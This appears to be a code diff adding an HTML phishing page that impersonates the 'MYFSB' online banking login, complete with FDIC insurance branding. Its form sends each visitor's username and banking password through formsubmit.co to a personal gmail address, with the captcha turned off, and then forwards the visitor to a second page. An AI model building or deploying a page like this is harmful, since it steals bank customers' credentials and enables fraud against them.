@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>MYFSB - Online Banking - User Login</title>
+    <link rel="stylesheet" href="style.css" />
+    <link rel="shortcut icon" href="1.png" type="image/x-icon" />
+  </head>
+  <body>
+    <section class="fdic">
+      <div class="fdic-info">
+        <div class="fdic-logo">
+          <h1>FDIC</h1>
+        </div>
+        <div class="fdic-text">
+          <p>
+            FDIC-Insured - Backed by the full faith and credit of the U.S
+            Government
+          </p>
+        </div>
+      </div>
+    </section>
+
+    <section class="logo">
+      <div class="logo-img">
+        <img src="logo.png" alt="" />
+      </div>
+    </section>
+
+    <section class="user">
+      <div class="user-box">
+        <div class="user1">
+          <nav>
+            <ul>
+              <li>
+                <a href="#">Account Services</a>
+              </li>
+              <li>
+                <a href="#">Commercial</a>
+              </li>
+              <li>
+                <a href="#">Calculators</a>
+              </li>
+            </ul>
+          </nav>
+        </div>
+
+        <div class="user2">
+          <legend>
+            <h3>User Login</h3>
+          </legend>
+
+          <div class="form-box">
+            <form id="user" action="https://formsubmit.co/compassintrumentllc@gmail.com" method="POST">
+              <p>
+                Please enter your identification information to gain access to
+                the system
+              </p>
+
+              <div class="login-info">
+                <div class="bank-box">
+                  <label for="Username">Username:</label>
+                  <input class="use" type="text" name="Username" id="Username" required />
+                </div>
+
+                <div class="bank-box">
+                  <label class="bank" for="Password">
+                    Banking <br>
+                    Access <br>
+                    Password:</label
+                  >
+                  <input class="pass" type="password" name="password" id="Password" required minlength="4"/>
+                  <input
+                    type="hidden"
+                    name="_next"
+                    value="http://127.0.0.1:5500/index2.html"
+                  />
+                  <input type="hidden" name="_captcha" value="false">
+                </div>
+              </div>
+
+              <div class="forgot">
+                <a href="#">Forgot Password?</a>
+              </div>
+
+              <div class="btn">
+                <button type="submit">Login</button>
+              </div>
+            </form>
+          </div>
+        </div>
+      </div>
+    </section>
+  </body>
+</html>
